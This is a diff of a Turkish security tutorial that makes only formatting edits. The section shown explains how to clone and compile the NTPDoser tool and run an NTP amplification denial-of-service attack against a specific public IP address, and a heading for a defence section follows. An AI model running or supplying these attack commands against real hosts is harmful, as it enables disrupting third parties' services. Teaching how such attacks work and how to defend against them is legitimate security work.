@@ -75,23 +75,16 @@ NTPDoser aracı, “Clone or Download” butonuna tıkladıktan sonra gelen “D
 ```linux
 root@Stormer:~# git clone https://github.com/DrizzleRisk/NTPDoser.git
 ```
-<br/>
-
 NTPDoser aracı, ZIP olarak indirmek dışında klonlanabilir. Aşağıda, indirilen C++ kaynak kodu derlenmektedir.
 
 ```linux
 root@Stormer:~/NTPDoser# gcc NTPDoser.cpp  -o NTPDoser  -lstdc++  -pthread
 ```
-
-<br/>
-
 Yukarıdaki komutunun çalıştırılması ile NTPDoser.cpp dosyası derlenerek NTPDoser çalıştırılabilir dosyası oluşturulur.
 
 ```linux
 root@Stormer:~/NTPDoser# ./NTPDoser 104.28.28.246 3 10
 ```
-<br/>
-
 Yukarıda, NTPDoser aracı ile NTP Amplification saldırısı yapılmıştır. 104.28.28.246 IP adresine yönelik NTP Amplification saldırısını 3 farklı thread’den 10 saniye içerisinde yapmaktadır.
 
 ## NTP Amplification Saldırılarına Karşı Koruma
